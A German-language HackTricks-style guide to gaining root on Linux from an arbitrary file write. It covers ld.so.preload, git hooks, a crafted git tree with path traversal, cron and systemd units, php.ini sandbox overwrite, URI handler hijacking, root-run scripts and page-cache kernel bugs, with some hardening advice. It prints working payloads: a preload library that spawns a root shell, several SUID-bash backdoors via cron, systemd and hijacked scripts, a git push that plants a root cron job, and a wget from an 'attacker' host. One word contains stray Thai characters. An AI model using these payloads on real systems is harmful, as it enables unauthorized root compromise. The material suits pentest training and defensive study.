# Beliebiges Schreiben in Dateien als Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ist eine systemweite Liste gemeinsam genutzter Objekte, die der dynamische Linker vor anderen gemeinsam genutzten Objekten lädt. Der Secure-Execution-Modus unterliegt zusätzlichen Einschränkungen beim Preloading, daher ist ein Bibliothekspfad wie `/tmp/pe.so` keine universelle Technik für SUID-Binärdateien.\
Wenn du die Datei erstellen oder ändern kannst, lädt ein Prozess, der die Datei lädt, die angegebene Bibliothek vor seinen anderen gemeinsam genutzten Objekten, wodurch die Ausführung von Code im Kontext dieses Prozesses ermöglicht wird.<sup>[[12]](#references)</sup>

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** sind ausführbare Skripte, die bei Ereignissen in einem Repository ausgeführt werden, einschließlich Commit- und Merge-Vorgängen. Wenn ein **privilegiertes Skript oder ein privilegierter Benutzer** diese Aktionen ausführt und ein Angreifer **in den `.git`-Ordner schreiben** kann, kann der Hook für **privilege escalation** verwendet werden.<sup>[[13]](#references)</sup>

Beispielsweise ist es möglich, ein **Skript** in einem Git-Repository unter **`.git/hooks`** zu **erstellen**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Pfad-Traversal beim Export eines privilegierten Git-Baums

Ein privilegierter Synchronizer kann einen checkout vermeiden und stattdessen mit `git ls-tree` ein vom Angreifer beeinflusstes Repository auflisten, jeden Blob mit `git cat-file` lesen, den gemeldeten Pfad an ein Staging-Verzeichnis anhängen und ihn selbst schreiben. Dies wird zu einem **beliebigen Dateischreibvorgang mit den Privilegien des Synchronizers**, wenn `-c safe.directory=*` (wodurch die Git-Schutzvorkehrung für Repositories mit anderem Eigentümer deaktiviert wird) mit einer fehlenden Prüfung der Zielpfad-Begrenzung kombiniert wird. Ein absoluter Tree-Entry-Name bewirkt, dass Python bei `os.path.join(stage, name)` `stage` verwirft; ein relativer Name mit `../` entkommt, sobald das Dateisystem ihn auflöst. Da die Anwendung den rohen Tree materialisiert, statt Git mit dem Checkout zu beauftragen, schützt die Ablehnung von Pfaden während des Checkouts den Sink nie.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Suche in Root-Services, Timern, Deployment-Agents, Template-Importern und Backup-/Restore-Jobs nach dieser Code-Struktur:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Ein Tree-Eintrag wird als `<mode> SP <name> NUL <raw object ID>` kodiert. Die Option `git hash-object --literally` erlaubt absichtlich Objektdaten, die beim normalen Parsen oder von `git fsck` abgelehnt werden könnten, sodass ein Disposable Clone einen Tree erstellen kann, dessen Dateiname ein absolutes Ziel ist. Dieses Beispiel erstellt einen Cron-Datei-Blob, verpackt den erstellten Tree in einen Commit und verschiebt einen Branch darauf; für die Ausnutzung sind weiterhin Berechtigungen zum Aktualisieren eines von dem privilegierten Job verwendeten Repositorys sowie ein Git-Server erforderlich, der das fehlerhafte Objekt akzeptiert.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Die Absicherung muss sowohl die Aufnahme in das Repository als auch die abschließende Dateisystemoperation abdecken:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Ersetze `safe.directory=*` durch die exakten Repositories, denen der Dienst vertrauen muss, und führe die Repository-Verarbeitung nach Möglichkeit ohne Root-Rechte aus.
- Lehne absolute Namen sowie alle Komponenten `.` oder `..` vor der Materialisierung ab. Kanonisiere das Ziel nach dem Zusammenfügen und überprüfe, dass es weiterhin unterhalb des vorgesehenen Stammverzeichnisses liegt.
- Vermeide Symlink-Races zwischen Prüfung und Öffnen: Öffne relativ zu einem vertrauenswürdigen Verzeichnisdeskriptor und verwende unter Linux für vom Angreifer kontrollierte Pfade `openat2()` mit `RESOLVE_BENEATH` und zusätzlich `RESOLVE_NO_SYMLINKS`.
- Bevorzuge einen normalen checkout in einem isolierten Verzeichnis gegenüber einer eigenen Implementierung des checkout anhand der Plumbing-Ausgabe. Wenn die Aufnahme von Raw-Objekten erforderlich ist, aktiviere die Validierung auf der Empfangsseite, z. B. `receive.fsckObjects=true`; stufe die für die Ablehnung manipulierter Trees erforderlichen pfadbezogenen `receive.fsck.*`-Befunde nicht herab.

### Cron- und Zeitdateien

Wenn du **Cron-bezogene Dateien schreiben kannst, die root ausführt**, kannst du normalerweise bei der nächsten Ausführung des Jobs Code-Ausführung erreichen. Interessante Ziele sind unter anderem:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Die eigene Crontab von Root in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd`-Timer und die von ihnen ausgelösten Dienste

Schnelle Prüfungen:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typische Missbrauchspfade:

- **Einen neuen root-Cronjob anhängen** an `/etc/crontab` oder eine Datei in `/etc/cron.d/`
- **Ein Script ersetzen**, das bereits von `run-parts` ausgeführt wird
- **Ein bestehendes Timer-Ziel backdooren**, indem das von ihm gestartete Script oder Binary geändert wird

Minimales Cron-Payload-Beispiel:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Wenn du nur in ein von `run-parts` verwendetes Cron-Verzeichnis schreiben kannst, lege stattdessen dort eine ausführbare Datei ab:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notizen:

- `run-parts` ignoriert normalerweise Dateinamen, die Punkte enthalten. Verwende daher vorzugsweise Namen wie `backup` anstelle von `backup.sh`.<sup>[[15]](#references)</sup>
- Einige Systeme verwenden `systemd`-Timer anstelle des klassischen cron, aber die Idee des Missbrauchs ist dieselbe: **ändere, was root später ausführen wird**.<sup>[[20]](#references)</sup>

### Service- und Socket-Dateien

Wenn du **`systemd`-Unit-Dateien** oder von ihnen referenzierte Dateien beschreiben kannst, ist es möglicherweise möglich, Codeausführung als root zu erreichen, indem du die Unit neu lädst und neu startest oder wartest, bis der Service-/Socket-Aktivierungspfad ausgelöst wird.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in-Überschreibungen in `/etc/systemd/system/<unit>.d/*.conf`
- Von `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` referenzierte Service-Skripte/-Binaries
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root-Service geladen werden

Schnellprüfungen:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Häufige Missbrauchswege:

- **`ExecStart=` überschreiben** in einer von root verwalteten Service-Unit, die du ändern kannst
- **Einen Drop-in-Override hinzufügen** mit einem schädlichen `ExecStart=` und den alten Eintrag zuerst löschen
- Das bereits von der Unit referenzierte **Script/Binary mit einer Backdoor versehen**
- Einen **socket-aktivierten Service hijacken**, indem du die zugehörige `.service`-Datei änderst, die gestartet wird, sobald der Socket eine Verbindung empfängt

Beispiel für einen schädlichen Override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typischer Aktivierungsablauf:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Wenn du Dienste nicht selbst neu starten kannst, aber eine socket-aktivierte Unit bearbeiten darfst, musst du möglicherweise nur **auf eine Client-Verbindung warten**, um die Ausführung des backdoored service als root auszulösen.<sup>[[17]](#references)</sup>

### Eine restriktive `php.ini` überschreiben, die von einer privilegierten PHP-Sandbox verwendet wird

Einige benutzerdefinierte Daemons validieren von Benutzern bereitgestelltes PHP, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel `disable_functions=exec,system,...`). Wenn der Code in der Sandbox weiterhin über **beliebige Schreibmöglichkeiten** (wie `file_put_contents`) verfügt und du den **genauen `php.ini`-Pfad** erreichen kannst, der vom Daemon verwendet wird, kannst du diese **Konfiguration überschreiben**, um die Einschränkungen aufzuheben, und anschließend einen zweiten Payload einreichen, der mit erweiterten Rechten ausgeführt wird.<sup>[[2]](#references)</sup>

Typischer Ablauf:

1. Der erste Payload überschreibt die Sandbox-Konfiguration.
2. Der zweite Payload führt Code aus, nachdem gefährliche Funktionen wieder aktiviert wurden.

Minimales Beispiel (ersetze den vom Daemon verwendeten Pfad):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Wenn der Daemon als root ausgeführt wird (oder mit root-eigenen Pfaden validiert), ergibt die zweite Ausführung einen root-Kontext. Dies ist im Wesentlichen eine **privilege escalation via config overwrite**, wenn die sandboxed Runtime weiterhin Dateien schreiben kann.

### binfmt_misc

`binfmt_misc` stellt Registrierungen unter `/proc/sys/fs/binfmt_misc` bereit; jede Registrierung ordnet einem Dateityp-Muster einen Interpreter zu. Die Auswirkungen auf die Privilegien hängen davon ab, wer die Registrierung ändern kann und welcher Prozess später die passende Datei ausführt. Überprüfe diese Voraussetzungen daher, bevor du dies als möglichen Pfad zur privilege escalation einstufst.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Desktop-Umgebungen verwenden MIME-Zuordnungen und Desktop-Einträge, um eine Anwendung für URI-Schemata auszuwählen. Ein Angreifer, der die relevanten benutzerbezogenen Konfigurations- und Desktop-Entry-Verzeichnisse beschreiben kann, kann diese Schemata auf einen von ihm kontrollierten Launcher umleiten. Durch die Änderung der Datei `$HOME/.config/mimeapps.list`, sodass HTTP- und HTTPS-URL-Handler auf eine bösartige Datei verweisen (zum Beispiel `x-scheme-handler/http=evil.desktop` und `x-scheme-handler/https=evil.desktop`), kann ein Benutzerklick diesen Desktop-Eintrag aufrufen.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Von Root ausgeführte, vom Benutzer beschreibbare Scripts/Binaries

Wenn ein privilegierter Workflow etwas wie `/bin/sh /home/username/.../script` ausführt (oder eine Binary innerhalb eines Verzeichnisses, das einem nicht privilegierten Benutzer gehört), kannst du es übernehmen:<sup>[[1]](#references)</sup>

- **Die Ausführung erkennen:** Überwache Prozesse mit pspy, um zu erkennen, wann root benutzerkontrollierte Pfade aufruft.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Schreibbarkeit bestätigen:** Stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören bzw. von ihm beschreibbar sind.
- **Ziel hijacken:** Sichere das ursprüngliche Binary/Skript und platziere einen Payload, der eine SUID-Shell (oder eine andere root-Aktion) erstellt, und stelle anschließend die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Die privilegierte Aktion auslösen** (z. B. durch Drücken einer UI-Schaltfläche, die den Helper startet). Wenn root den hijacked Pfad erneut ausführt, die eskalierte Shell mit `./rootshell -p` übernehmen.

### Nur den Page-Cache betreffende Dateimodifikation privilegierter Binaries

Einige Kernel-Bugs modifizieren die Datei **nicht auf der Festplatte**. Stattdessen ermöglichen sie nur die Modifikation der **Page-Cache-Kopie einer lesbaren Datei**. Wenn ein **setuid**- oder anderweitig **von root ausgeführtes** Binary als Ziel verwendet werden kann, führt die nächste Ausführung möglicherweise vom Angreifer kontrollierte Bytes aus dem Speicher aus und eskaliert die Privilegien, obwohl der Datei-Hash auf der Festplatte unverändert ist.<sup>[[3]](#references)[[4]](#references)</sup>

Dies lässt sich als **Runtime-only file write primitive** betrachten:<sup>[[3]](#references)</sup>

- **Die Festplatte bleibt sauber**: Inode und Bytes auf der Festplatte ändern sich nicht
- **Der Speicher ist verändert**: Prozesse, die die gecachte Page lesen oder ausführen, erhalten den vom Angreifer modifizierten Inhalt
- **Der Effekt ist temporär**: Die Änderung verschwindet nach einem Neustart oder dem Verdrängen aus dem Cache

Diese Primitive liegt zwischen dem klassischen **arbitrary file write** und älteren Bugs zum **page-cache abuse** wie Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW war auf eine Race Condition angewiesen
- Dirty Pipe hatte Einschränkungen bei der Schreibposition
- Eine Page-Cache-only-Primitive kann zuverlässiger sein, wenn der verwundbare Pfad direkte Schreibzugriffe in gecachte, dateigestützte Pages ermöglicht

#### Allgemeiner privesc-Ablauf

1. Eine Kernel-Primitive erhalten, die in **dateigestützte Page-Cache-Pages** schreiben kann
2. Sie gegen ein **lesbares privilegiertes Binary** oder eine andere von root ausgeführte Datei einsetzen
3. Die Ausführung **auslösen, bevor** die Page aus dem Cache verdrängt wird
4. Codeausführung als root erhalten, während die Datei auf der Festplatte weiterhin unverändert aussieht

Typische Ziele mit hohem Wert:

- **setuid-root**-Binaries
- Helper, die von **root-Services** gestartet werden
- Binaries, die häufig aus **Containern ausgeführt werden, die den Host-Kernel/Page-Cache gemeinsam verwenden**

#### AF_ALG + `splice()`-Beispielpfad

Copy Fail (CVE-2026-31431) ist ein gutes Beispiel für diese Klasse. Der verwundbare Pfad befand sich in der Linux-Crypto-Userspace-API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` kann Referenzen auf Page-Cache-Pages aus einer lesbaren Datei in die Crypto-TX-Scatterlist verschieben
- der In-Place-Entschlüsselungspfad von `algif_aead` verwendete Quell- und Zielpuffer wieder
- `authencesn` schrieb anschließend in die Ziel-Tag-Region
- wenn diese Region weiterhin auf gesplicete, dateigestützte Pages verwies, landete der Schreibvorgang im **Page-Cache der Zieldatei**

Die interessante Technik ist daher nicht die CVE selbst, sondern das Muster:

- **dateigestützte Cache-Pages in ein Kernel-Subsystem einspeisen**
- das Subsystem dazu bringen, sie als beschreibbare Ausgabe zu **behandeln**
- eine kleine, kontrollierte Überschreibung im Speicher auslösen

Der öffentliche PoC verwendete wiederholte **4-Byte-Schreibvorgänge**, um `/usr/bin/su` im Speicher zu patchen und anschließend auszuführen.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter-TEE-Clone-Beispielpfad

DirtyClone (CVE-2026-43503) zeigt eine weitere Variante desselben **page-cache-only write-to-root**-Musters, diesmal jedoch mit **IPsec-ESP-Entschlüsselung** statt `AF_ALG` als Senke.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Die wichtige Technik ist der Schritt des **Metadata-Laundering**:

- `splice()` platziert eine **schreibgeschützte, dateigestützte Page-Cache-Page** in einem ESP-in-UDP-Paket
- die ursprüngliche DirtyFrag-Abwehr markierte das skb mit `SKBFL_SHARED_FRAG`, damit `esp_input()` **vor der Entschlüsselung eine Kopie erstellt**
- netfilter `TEE` dupliziert das Paket über `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- der Clone behält dieselbe **physische Page-Cache-Referenz**, verliert aber `SKBFL_SHARED_FRAG`
- `esp_input()` behandelt den Clone anschließend als sicher und führt die **In-Place-Entschlüsselung mit `cbc(aes)`** über der dateigestützten Page aus

Die Lehre für Reviewer ist daher umfassender als die CVE: Wenn eine Abwehr auf **skb/Page-Metadaten** angewiesen ist, um zu entscheiden, ob zunächst kopiert werden muss, kann jeder **Clone-/Kopierpfad, der die zugrunde liegende Page beibehält, aber die Metadaten entfernt**, die Schreib-Primitive unbemerkt wieder öffnen.

Typischer Exploit-Ablauf:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` verwenden, um **`CAP_NET_ADMIN` innerhalb eines privaten Network-Namespace** zu erhalten
2. Loopback aktivieren und eine **netfilter-`TEE`-Regel** in `mangle/OUTPUT` installieren
3. **XFRM-ESP-Transport-SAs** über `NETLINK_XFRM` installieren
4. jedes anvisierte 4-Byte-Wort im SA-`seq_hi`-Feld kodieren (DirtyFrags Trick zur Wอร์tauswahl)
5. das gesplicete ESP-in-UDP-Paket senden, damit der **TEE-Clone** `esp_input()` erreicht und **In-Place** entschlüsselt wird
6. wiederholen, bis die Page-Cache-Kopie von `/usr/bin/su` oder einer anderen privilegierten ausführbaren Datei vom Angreifer kontrollierten Code enthält

Operativ ist die Auswirkung dieselbe wie im `AF_ALG`-Beispiel: Die Datei auf der Festplatte bleibt sauber, aber `execve()` verwendet die **veränderten Page-Cache-Bytes** und liefert root.<sup>[[8]](#references)[[9]](#references)</sup>

Nützliche Checks zur Ermittlung der Exposition bei dieser Variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Die kurzfristige Reduzierung der Angriffsfläche ist auch hier pfadspezifisch: Ein Upgrade auf einen Kernel mit `48f6a5356a33` behebt den clone path, während das Blockieren des automatischen Ladens von `xt_TEE` den **flag-laundering step** entfernt und das Blockieren von `esp4` / `esp6` den **decrypt sink** entfernt.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure und Hunting

Wenn du diese Fehlerklasse vermutest, verlasse dich nicht ausschließlich auf Prüfungen der Festplattenintegrität. Überprüfe außerdem:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Die folgenden Konfigurationswerte unterscheiden eine ladbare Schnittstelle von einer direkt in den Kernel integrierten Schnittstelle; die Crypto-Build-Regeln ordnen `CONFIG_CRYPTO_USER_API_AEAD` `algif_aead` zu.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kann als Modul geladen und entladen werden
- `CONFIG_CRYPTO_USER_API_AEAD=y`: Die Schnittstelle ist in den Kernel integriert
- setuid-Binaries sind gute Ziele, da ein Patch, der ausschließlich den Page Cache betrifft, aus einem lokalen foothold eine Root-Shell machen kann

#### Reduzierung der Angriffsfläche für den Pfad `algif_aead`

Wenn die verwundbare Schnittstelle von einem ladbaren Modul bereitgestellt wird:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Wenn es in den Kernel kompiliert ist, wurde in einigen Veröffentlichungen berichtet, dass der init-Pfad mit Folgendem blockiert wird:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Diese Art der Mitigation sollte auch bei anderen Kernel-LPEs berücksichtigt werden: Wenn die Ausnutzung von einer bestimmten optionalen Schnittstelle abhängt, kann das Deaktivieren oder Blacklisting dieser Schnittstelle den Exploit-Pfad unterbrechen, noch bevor ein vollständiges Kernel-Upgrade verfügbar ist.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – Hijacking eines als root ausgeführten Scripts in einem benutzerschreibbaren PaperCut-Verzeichnis](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security-Veröffentlichung zu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux-Stable-Fix: crypto: algif_aead - Zurücksetzen auf Betrieb out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431-Advisory](https://copy.fail/)
- [7] [Technischer Bericht von Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-Repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Analyse und Ausnutzung der Linux-LPE-Variante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-Fix: net: skb: `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` beibehalten (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Frühere Linux-Mitigation: `SKBFL_SHARED_FRAG` für gesplicte UDP-Pakete setzen (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian-Handbuchseite](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Die Linux-Kernel-Dokumentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME-Anwendungszuordnungen](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared-MIME-info-Spezifikation](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop-Entry-Spezifikation](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-Sprache](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux-Krypto-Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: AF_ALG-Page-Cache-Schwachstelle im Linux-Kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Dokumentation zu Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Dokumentation zu Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Dokumentation zur Git-Konfiguration](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
